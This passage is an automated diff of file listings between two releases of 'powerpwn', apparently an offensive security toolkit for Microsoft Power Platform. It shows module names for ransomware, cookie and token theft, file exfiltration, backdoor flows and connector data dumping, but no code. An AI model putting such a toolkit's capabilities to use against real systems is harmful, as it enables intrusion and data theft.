# Comparing `tmp/powerpwn-2.1.1.tar.gz` & `tmp/powerpwn-2.1.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "powerpwn-2.1.1.tar", last modified: Fri Jul 28 13:44:11 2023, max compression
+gzip compressed data, was "powerpwn-2.1.2.tar", last modified: Tue Aug  1 10:50:43 2023, max compression
```

## Comparing `powerpwn-2.1.1.tar` & `powerpwn-2.1.2.tar`

### file list

```diff
@@ -1,131 +1,135 @@
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:11.367625 powerpwn-2.1.1/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       76 2023-07-28 13:44:11.367625 powerpwn-2.1.1/PKG-INFO
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1592 2023-07-28 13:44:11.367625 powerpwn-2.1.1/setup.cfg
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       73 2023-07-24 10:03:36.000000 powerpwn-2.1.1/setup.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:03.758803 powerpwn-2.1.1/src/
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:04.168609 powerpwn-2.1.1/src/powerpwn/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:04.656009 powerpwn-2.1.1/src/powerpwn/cli/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 06:41:41.000000 powerpwn-2.1.1/src/powerpwn/cli/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6954 2023-07-28 13:42:29.000000 powerpwn-2.1.1/src/powerpwn/cli/arguments.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       49 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/cli/const.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4241 2023-07-28 07:55:29.000000 powerpwn-2.1.1/src/powerpwn/cli/runners.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:04.765664 powerpwn-2.1.1/src/powerpwn/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1399 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/enums/str_enum.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:04.875467 powerpwn-2.1.1/src/powerpwn/machinepwn/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:05.063767 powerpwn-2.1.1/src/powerpwn/machinepwn/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      231 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/enums/code_exec_type_enum.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      311 2023-07-28 07:20:23.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/enums/command_to_run_enum.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5960 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/machine_pwn.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:06.100522 powerpwn-2.1.1/src/powerpwn/machinepwn/models/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      929 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/any_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      446 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/cleanup_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      549 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/cmd_arguments.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1601 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/cmd_results.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      448 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/code_exec_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      426 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/code_exec_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       96 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/command_args_properties_base_model.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      292 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/exflirtate_file_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      456 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/exflirtate_file_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      571 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/ransomware_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      435 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/ransomware_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      302 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/steal_cookie_args_properties.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      444 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/steal_cookie_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      500 2023-07-27 09:25:53.000000 powerpwn-2.1.1/src/powerpwn/machinepwn/models/steal_power_automate_token_command_args.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1229 2023-07-28 07:55:33.000000 powerpwn-2.1.1/src/powerpwn/main.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:06.351247 powerpwn-2.1.1/src/powerpwn/powerdoor/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3765 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/backdoor_flow.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      311 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/create_flow_model.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:06.537166 powerpwn-2.1.1/src/powerpwn/powerdoor/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      233 2023-07-28 07:20:23.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/enums/action_type.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      126 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/enums/flow_state.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1845 2023-07-28 07:22:29.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/flow_factory_installer.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:06.731790 powerpwn-2.1.1/src/powerpwn/powerdoor/samples/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/samples/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)    23081 2023-07-27 21:35:53.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/samples/flow_factory_to_install.json
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2579 2023-07-24 10:03:36.000000 powerpwn-2.1.1/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:06.797800 powerpwn-2.1.1/src/powerpwn/powerdump/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:06.859276 powerpwn-2.1.1/src/powerpwn/powerdump/collect/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:07.089168 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/__init__.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:07.242562 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3485 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:08.295766 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1577 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2507 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6158 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1767 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     7120 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4139 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/keyvault.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5868 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azureblob.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3777 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azurequeues.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3897 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_azuretables.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3934 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_documentdb.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4330 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/shared_sql.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1235 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/data_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:08.573156 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      132 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_source.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      280 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/enums/data_dump_type.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      211 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/data_collectors/idata_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:09.416104 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      756 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/base_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      524 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/base_validator.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      477 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/canvas_app_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1293 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/connection_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2047 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/connector_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      674 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_dump_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      781 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_record_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1027 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_store_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      496 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/data_store_validator.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      507 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/principal_entity.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      370 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/models/resource_entity_base.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:09.910849 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3424 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/_api.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4944 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4689 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/connections_collector.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2721 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/connectors_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:10.061285 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/enums/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/enums/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      202 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/enums/resource_type.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      707 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/iresource_collector.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     2659 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/collect/resources_collectors/resources_collector.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:10.244255 powerpwn-2.1.1/src/powerpwn/powerdump/gui/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1739 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/gui.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4377 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/prep.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:10.788047 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       73 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1367 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/base.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1150 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/canvasapps_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1728 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/connections_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      983 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/connectors_table.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      303 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/json_object.html
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1146 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/gui/templates/resources_table.html
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:11.316644 powerpwn-2.1.1/src/powerpwn/powerdump/utils/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/__init__.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4291 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/auth.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      376 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/const.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4593 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/json_utils.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5133 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/model_loaders.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1107 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/path_utils.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     3124 2023-07-28 07:22:48.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/requests_wrapper.py
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1098 2023-07-27 11:45:05.000000 powerpwn-2.1.1/src/powerpwn/powerdump/utils/token_cache.py
-drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 13:44:04.455745 powerpwn-2.1.1/src/powerpwn.egg-info/
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       76 2023-07-28 13:44:01.000000 powerpwn-2.1.1/src/powerpwn.egg-info/PKG-INFO
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     5991 2023-07-28 13:44:03.000000 powerpwn-2.1.1/src/powerpwn.egg-info/SOURCES.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        1 2023-07-28 13:44:01.000000 powerpwn-2.1.1/src/powerpwn.egg-info/dependency_links.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       48 2023-07-28 13:44:01.000000 powerpwn-2.1.1/src/powerpwn.egg-info/entry_points.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      332 2023-07-28 13:44:01.000000 powerpwn-2.1.1/src/powerpwn.egg-info/requires.txt
--rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        9 2023-07-28 13:44:01.000000 powerpwn-2.1.1/src/powerpwn.egg-info/top_level.txt
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:43.224560 powerpwn-2.1.2/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       76 2023-08-01 10:50:43.226556 powerpwn-2.1.2/PKG-INFO
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1590 2023-08-01 10:50:43.235557 powerpwn-2.1.2/setup.cfg
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       73 2023-07-24 10:03:36.000000 powerpwn-2.1.2/setup.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:34.428648 powerpwn-2.1.2/src/
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:34.924925 powerpwn-2.1.2/src/powerpwn/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/__init__.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:35.403436 powerpwn-2.1.2/src/powerpwn/cli/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-28 06:41:41.000000 powerpwn-2.1.2/src/powerpwn/cli/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     8159 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/cli/arguments.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       49 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/cli/const.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     4838 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/cli/runners.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:35.526454 powerpwn-2.1.2/src/powerpwn/enums/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/enums/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1399 2023-07-24 10:03:36.000000 powerpwn-2.1.2/src/powerpwn/enums/str_enum.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1229 2023-07-28 07:55:33.000000 powerpwn-2.1.2/src/powerpwn/main.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:35.623368 powerpwn-2.1.2/src/powerpwn/nocodemalware/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/__init__.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:35.811167 powerpwn-2.1.2/src/powerpwn/nocodemalware/enums/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/enums/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      231 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/enums/code_exec_type_enum.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      311 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/enums/command_to_run_enum.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     6005 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/malware_runner.py
+drwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-08-01 10:50:37.147649 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)        0 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/__init__.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      947 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/any_command_args.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      455 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/cleanup_command_args.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      555 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/cmd_arguments.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)     1601 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/cmd_results.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      454 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/code_exec_args_properties.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      435 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/code_exec_command_args.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)       96 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/command_args_properties_base_model.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      295 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/exflirtate_file_args_properties.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      465 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/exflirtate_file_command_args.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      574 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/ransomware_args_properties.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      444 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/ransomware_command_args.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      305 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/steal_cookie_args_properties.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      453 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/steal_cookie_command_args.py
+-rwxrwxrwx   0 mbrg      (1000) mbrg      (1000)      509 2023-07-30 13:50:57.000000 powerpwn-2.1.2/src/powerpwn/nocodemalware/models/steal_power_automate_token_command_args.py
